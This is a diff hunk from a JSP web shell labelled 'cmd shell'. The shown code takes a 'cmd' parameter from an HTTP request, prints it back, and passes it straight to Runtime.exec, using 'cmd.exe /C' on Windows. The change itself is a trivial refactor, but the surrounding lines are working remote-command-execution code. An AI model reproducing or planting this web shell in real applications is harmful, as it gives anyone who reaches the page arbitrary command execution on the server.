@@ -10,7 +10,7 @@ cmd shell
     if (request.getParameter("cmd") != null) {
         out.println("Command: " + request.getParameter("cmd") + "<BR>");
         Process p;
-        if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
+        if (System.getProperty("os.name").toLowerCase().contains("windows")){
             p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
         }
         else{
